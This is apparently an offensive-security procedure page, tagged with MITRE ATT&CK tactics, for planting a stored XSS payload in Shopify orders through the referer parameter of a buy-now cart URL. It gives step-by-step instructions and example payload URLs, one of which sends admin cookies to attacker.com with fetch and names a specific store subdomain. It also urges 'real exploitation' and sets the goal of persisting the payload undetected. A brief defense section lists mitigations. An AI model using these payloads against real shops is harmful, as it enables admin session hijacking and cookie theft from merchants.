---
tags:
  - xss
  - payload-injection
  - shopify-checkout
type: procedure
tools:
  - '[[tools/Custom-JavaScript-Exploit-Script]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:52.864Z'
sub_techniques: []
id: 4118673b-39e5-4582-9241-2e21000c59d4
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Submit-Order-with-XSS-Payload

## Summary

This procedure involves modifying the referer parameter in a Shopify buy now cart URL with a JavaScript XSS payload and completing the order to persist the payload in the shop's database for later admin execution.

## Description

The attack targets the lack of sanitization in the referer parameter during order processing. By crafting a URL like `https://store.myshopify.com/cart/1188733065:1?channel=buy_button&referer=javascript:alert(document.cookie)`, the payload is stored and rendered as a clickable link in the admin panel. Use an advanced payload from the custom script for real exploitation. Prerequisites: Valid cart URL from buy now button, payment details. Outcomes: Payload persistence, setting up for admin-side execution.

## Requirements

1. Generated cart URL from buy now button
2. Payment information to complete checkout (test card acceptable)
3. Browser tools to modify or intercept the URL (e.g., dev tools or proxy)

## Defense

Defensive measures and detection strategies:

- Validate and encode referer parameters to block javascript: schemes
- Use Content Security Policy (CSP) to restrict script execution in admin
- Log and alert on suspicious referer values during order creation

## Objectives

1. Inject XSS payload into order metadata
2. Persist the payload server-side without detection
3. Enable delayed execution in admin context

## Instructions

### Step 1: Modify Referer Parameter

**Context**: Intercept the buy now redirect to insert the payload.

**Instructions**: Use browser dev tools or a proxy to alter the URL: replace referer with `javascript:alert(document.cookie)` or load the advanced payload from [[tools/Custom-JavaScript-Exploit-Script]] via `<script src="https://.../1.js"></script>` embedded in the URI.

> Example URL: `https://madamcury.myshopify.com/cart/1188733065:1?channel=buy_button&referer=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)`.

### Step 2: Proceed to Checkout and Complete Order

**Context**: Submit the order to store the tainted referer.

**Instructions**: Enter shipping/billing details and finalize payment in Shopify's checkout flow. No additional modifications needed post-injection.

> Expected: Order confirmation email; referer saved in backend.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Custom-JavaScript-Exploit-Script]]

## Tags

- [[xss]]
- [[payload-injection]]
